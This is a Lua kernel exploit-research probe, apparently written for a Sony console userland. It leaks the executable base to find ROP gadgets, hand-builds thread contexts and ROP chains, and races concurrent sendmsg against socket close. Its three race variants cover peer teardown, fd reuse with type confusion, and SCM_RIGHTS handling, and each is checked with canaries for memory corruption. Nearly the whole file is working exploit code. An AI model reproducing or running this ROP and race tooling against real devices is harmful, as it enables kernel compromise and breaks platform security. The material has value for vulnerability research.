-- CRASH_CLASS: HIGH
-- PROBE 93a: Socket close race — concurrent sendmsg vs close
--
-- Child threads loop sendmsg on socket B via ROP chain (~675 iterations).
-- Main thread closes A (peer) or B (self) mid-flight. Three variants:
--   A) data sends on B, close(A) — peer teardown race (unp_disconnect vs sosend)
--   B) data sends on B, close(B) + AF_INET reclaim — fd reuse / type confusion
--   C) SCM_RIGHTS sends on B, close(A) — unp_internalize vs peer teardown
--
-- Unlike 90a which needed dup2 (blocked), children do the sendmsg loop.
-- Detection: getpid canary, sys 624 VM counter, process survival.

print("=== PROBE 93a: SOCKET CLOSE RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

-- eboot base + gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

-- thr_create context offsets (Sony layout, confirmed 91u)
local _DI=0x048; local _SI=0x050; local _DX=0x058
local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

-- parameters
local NSEND=4
local ROUNDS_A=15
local ROUNDS_B=12
local ROUNDS_C=12
local STK_PG=1
local PG_PER_CHILD=STK_PG+1

local MAX_CH=(ROUNDS_A+ROUNDS_B+ROUNDS_C)*NSEND+8
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD
print(string.format("ch=%d pg=%d (~%dMB)", MAX_CH, TOTAL_PG, TOTAL_PG*16/1024))

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X",R))

-- shared data area (first 2 pages)
local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl2=R+0x20; wq(sl2,uint64(0)); wq(sl2+8,uint64(2000000))   -- 2ms
local sl5=R+0x40; wq(sl5,uint64(0)); wq(sl5+8,uint64(5000000))   -- 5ms
local sl20=R+0x60; wq(sl20,uint64(0)); wq(sl20+8,uint64(20000000)) -- 20ms
local tb=R+0x80
local sv_buf=R+0x90

-- data-only msghdr: 1 byte payload, no cmsg
local data_byte=R+0x100; wd(data_byte, 0x42)
local data_iov=R+0x110
wq(data_iov, uint64(data_byte)); wq(data_iov+8, uint64(1))
local data_msg=R+0x120; z(data_msg, 0x30)
wq(data_msg+0x10, uint64(data_iov)); wd(data_msg+0x18, 1)

-- SCM_RIGHTS msghdr: 1 byte payload + cmsg passing a fd
local scm_byte=R+0x180; wd(scm_byte, 0x43)
local scm_iov=R+0x190
wq(scm_iov, uint64(scm_byte)); wq(scm_iov+8, uint64(1))
local scm_cmsg=R+0x1A0; z(scm_cmsg, 32)
wd(scm_cmsg, 20)         -- cmsg_len = CMSG_LEN(sizeof(int))
wd(scm_cmsg+4, 0xFFFF)   -- SOL_SOCKET
wd(scm_cmsg+8, 1)        -- SCM_RIGHTS
local scm_msg=R+0x1C0; z(scm_msg, 0x30)
wq(scm_msg+0x10, uint64(scm_iov)); wd(scm_msg+0x18, 1)
wq(scm_msg+0x20, uint64(scm_cmsg)); wd(scm_msg+0x28, 24)

-- Block SIGPIPE
local sa_buf=memory.alloc(32); z(sa_buf,32); wq(sa_buf,uint64(1))
native.fcall_with_rax(stub,416,13,N(sa_buf),0)
print("SIGPIPE blocked")

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function spawn_sender(sock_fd, msg_addr)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP: loop sendmsg(sock_fd, msg_addr, MSG_NOSIGNAL|MSG_DONTWAIT)
    -- RDI/RSI/RDX set in context, unchanged across iterations.
    -- Each cycle: PRAX(8) + 28(8) + SA(8) = 24 bytes
    local off=0
    local ncycles=math.floor((stk_bytes-200)/24)
    for i=1,ncycles do
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(28)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- tail: nanosleep(999s) — child dies at process exit
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8

    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(28))            -- sendmsg
    wq(ctx+_DI,uint64(sock_fd))       -- socket fd
    wq(ctx+_SI,uint64(msg_addr))      -- msghdr pointer
    wq(ctx+_DX,uint64(0x20080))       -- MSG_NOSIGNAL|MSG_DONTWAIT

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

local function mkpair()
    wq(sv_buf,uint64(0))
    local rv=N(native.fcall_with_rax(stub,135,1,1,0,N(sv_buf)))
    if rv~=0 then return nil,nil end
    return rd(sv_buf), rd(sv_buf+4)
end

-- ============================================================
-- GATE: verify child sendmsg actually works
-- ============================================================
print("--- GATE ---")
local GA,GB=mkpair()
if not GA then print("GATE PAIR FAIL") return end
spawn_sender(GB, data_msg)
native.fcall_with_rax(stub,240,sl20,0)  -- 20ms

local rbuf=memory.alloc(8); wd(rbuf,0)
local riov=memory.alloc(16); wq(riov,uint64(rbuf)); wq(riov+8,uint64(8))
local rmsg=memory.alloc(0x30); z(rmsg,0x30)
wq(rmsg+0x10,uint64(riov)); wd(rmsg+0x18,1)
local gr=N(native.fcall_with_rax(stub,27,GA,N(rmsg),0))
local gb=rd(rbuf) or 0
print("gate recv="..gr.." byte=0x"..string.format("%X",gb))
if gr<=0 then
    print("GATE FAIL: child sendmsg did not deliver")
    native.fcall_with_rax(stub,6,GA); native.fcall_with_rax(stub,6,GB)
    return
end
print("GATE OK: child sendmsg confirmed")
native.fcall_with_rax(stub,6,GA); native.fcall_with_rax(stub,6,GB)

-- ============================================================
-- A: DATA vs CLOSE(PEER) — unp_disconnect race
-- ============================================================
print("")
print("--- A: DATA vs CLOSE(PEER) ---")

local hits_a=0
local vm0=vmc()
for round=1,ROUNDS_A do
    if cidx>=MAX_CH-NSEND then print("A"..round..": LIMIT") break end
    local A,B=mkpair()
    if not A then print("A"..round..": PAIR") break end

    for i=1,NSEND do spawn_sender(B, data_msg) end
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,A)   -- RACE: close peer

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_a=hits_a+1; print(string.format("A%02d: !! CANARY=%d",round,c)) end
    if round%5==0 then print(string.format("A%02d: ok ch=%d",round,cidx)) end
    native.fcall_with_rax(stub,6,B)
end
local vm1=vmc()
print(string.format("A done: hits=%d vm=%d->%d d=%d", hits_a,vm0,vm1,vm1-vm0))

-- ============================================================
-- B: DATA vs CLOSE(SELF)+RECLAIM — fd reuse, type confusion
-- ============================================================
print("")
print("--- B: DATA vs CLOSE(SELF)+RECLAIM ---")

local hits_b=0
local reclaim=0
vm0=vmc()
for round=1,ROUNDS_B do
    if cidx>=MAX_CH-NSEND then print("B"..round..": LIMIT") break end
    local A,B=mkpair()
    if not A then print("B"..round..": PAIR") break end

    for i=1,NSEND do spawn_sender(B, data_msg) end
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,B)   -- RACE: close sender's socket
    -- immediately reclaim fd B with AF_INET DGRAM
    local nf=N(native.fcall_with_rax(stub,97,2,2,0))
    if nf==B then reclaim=reclaim+1 end

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_b=hits_b+1; print(string.format("B%02d: !! CANARY=%d",round,c)) end
    if round%5==0 then
        print(string.format("B%02d: ok ch=%d recl=%d/%d nf=%d",round,cidx,reclaim,round,nf))
    end
    if nf>0 then native.fcall_with_rax(stub,6,nf) end
    native.fcall_with_rax(stub,6,A)
end
vm1=vmc()
print(string.format("B done: hits=%d recl=%d/%d vm=%d->%d d=%d",
    hits_b,reclaim,ROUNDS_B,vm0,vm1,vm1-vm0))

-- ============================================================
-- C: SCM_RIGHTS vs CLOSE(PEER) — unp_internalize race
-- ============================================================
print("")
print("--- C: SCM_RIGHTS vs CLOSE(PEER) ---")

local hits_c=0
vm0=vmc()
for round=1,ROUNDS_C do
    if cidx>=MAX_CH-NSEND then print("C"..round..": LIMIT") break end
    local A,B=mkpair()
    if not A then print("C"..round..": PAIR") break end

    local tgt=N(native.fcall_with_rax(stub,97,2,2,0))
    wd(scm_cmsg+16, tgt)

    for i=1,NSEND do spawn_sender(B, scm_msg) end
    native.fcall_with_rax(stub,240,sl2,0)

    native.fcall_with_rax(stub,6,A)   -- RACE: close peer

    native.fcall_with_rax(stub,240,sl5,0)
    local c=N(native.fcall_with_rax(stub,20))
    if c~=pid then hits_c=hits_c+1; print(string.format("C%02d: !! CANARY=%d",round,c)) end
    if round%5==0 then print(string.format("C%02d: ok ch=%d",round,cidx)) end
    native.fcall_with_rax(stub,6,B)
    if tgt>0 then native.fcall_with_rax(stub,6,tgt) end
end
vm1=vmc()
print(string.format("C done: hits=%d vm=%d->%d d=%d", hits_c,vm0,vm1,vm1-vm0))

-- ============================================================
print("")
print(string.format("SUMMARY: A=%d B=%d C=%d ch=%d",hits_a,hits_b,hits_c,cidx))
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 93a COMPLETE ===")
